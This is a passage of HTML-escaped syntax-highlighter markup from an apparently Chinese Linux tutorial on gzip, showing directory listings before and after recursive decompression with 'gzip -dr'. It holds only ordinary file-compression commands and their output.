&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-50&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-51&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-52&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-53&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-54&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-55&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0105 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;这样，所有test下面的文件都变成了*.gz，目录依然存在只是目录里面的文件相应变成了*.gz.这就是压缩，和打包不同。因为是对目录操作，所以需要加上-r选项，这样也可以对子目录进行递归了。&lt;/p&gt;
&lt;p&gt;实例6：递归地解压目录&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b83849314029&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
gzip -dr test6&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b83849314029-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b83849314029-1&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;gzip&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;dr&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b87339546076&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test6]# ll

总计 28

---xr--r-- 1 root mail  1341 11-30 08:39 linklog.log.gz

---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz

-rw-r--r-- 1 mail users   70 11-30 08:39 log2013.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2014.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2015.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2016.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2017.log.gz

[root@localhost test6]# cd ..

[root@localhost test]# gzip -dr test6

[root@localhost test]# cd test6

[root@localhost test6]# ll

总计 604

---xr--r-- 1 root mail  302108 11-30 08:39 linklog.log

---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log

-rw-r--r-- 1 mail users     61 11-30 08:39 log2013.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2014.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2015.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2016.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2017.log

[root@localhost test6]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b87339546076-43&quot;&gt;43&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-3&quot;&gt;总计 &lt;span class=&quot;crayon-cn&quot;&gt;28&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;1341&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1341&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;70&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-13&quot;&gt;
